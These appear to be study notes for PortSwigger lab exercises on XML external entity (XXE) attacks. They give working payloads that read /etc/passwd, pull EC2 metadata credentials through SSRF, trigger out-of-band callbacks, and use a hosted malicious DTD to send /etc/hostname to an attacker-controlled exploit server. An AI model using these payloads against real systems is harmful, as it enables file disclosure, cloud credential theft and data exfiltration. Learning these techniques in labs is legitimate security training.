# XXE

- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/xml-entities
- https://portswigger.net/web-security/xxe/blind

## Exploiting XXE using external entities to retrieve files

`POST /product/stock` requests check the amount of products in the store and uses XML as a data format as seen in the request body below:

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

Once we modify the `productId` to a `WRONG` value, we can notice that it is being reflected as an error, so if this part would be vulnerable to XXE, we could read system files this way.

Modifying the request to below body results in the error response containign `file123`, which proves that the parser uses unsafe features of external entities

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE check [<!ENTITY file "file123">]>
<stockCheck><productId>&file;</productId><storeId>1</storeId></stockCheck>
```


`<!DOCTYPE check [...]>` defines document and allow specifing its entities.

`< ... [<!ENTITY file "file123">]>` defines an entity `file`, which when accessed by `&file;` will result in value `file123`

Now we can modify the entity to the below value, which will contain the content of `/etc/passwd` file inside `file` entity, which once reference in `productId` param will retrieve its value and result in an error displaying it to us.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE check [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&file;</productId><storeId>1</storeId></stockCheck>
```

## Exploiting XXE to perform SSRF attacks

Same history in this task, but this time we need to retrieve the value from external source (simulated EC2 instace metadata endpoint). To achieve this the following payload could be used

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dxxe [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

`http://169.254.169.254/` was provided in the lab description and fetching its content responded with all the possible next paths that could be taken and that proces ran recursively solves the lab.

Finding secret keys path in steps:
 - `/` -> `latest`
 - `/latest` -> `meta-data`
 - `/latest/meta-data` -> `iam`
 - and so on...

EC2 docs could also be checked for this.

## Blind XXE with out-of-band interaction

Burp Collaborator required - Pro feature only.

To solve the lab create entity definition `xxe` as shown below and reference in `productId` key, by `&xxe;`:

```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```

## Blind XXE with out-of-band interaction via XML parameter entities

Burp Collaborator required - Pro feature only.

Solving the lab here is nearly the same as before, but this time casual entities are blocked. Fortunately we can make use of parameter entities.

```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.

## Exploiting blind XXE to exfiltrate data using a malicious external DTD

We cannot retrieve the file content via error messages, because always general error response is returned. 

To solve this lab we require a server that would host a malicious partial dtd declaration shown below.

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://exploit-0a58001904b1e593812c83dd01d80063.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```

Now again in `POST /product/stock` request by modyfing the body, injecting the below payload leaks the hostname as a request param in explot server.

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a58001904b1e593812c83dd01d80063.exploit-server.net/exploit.dtd"> %xxe;]>
```

How this works?

By specifing and invoking `xxe` parameter entity, we say to the parser to fetch further `ENTITY` definitions from specified url and inject them into `DOCTYPE` definition. Further fetched `ENTITY` definitions will read `/etc/hostname` file by `%filel;` entity and dynamically create and entity `%exfiltrate` that will fetch remote server with one of the query params containing file content via `%eval;` entity.
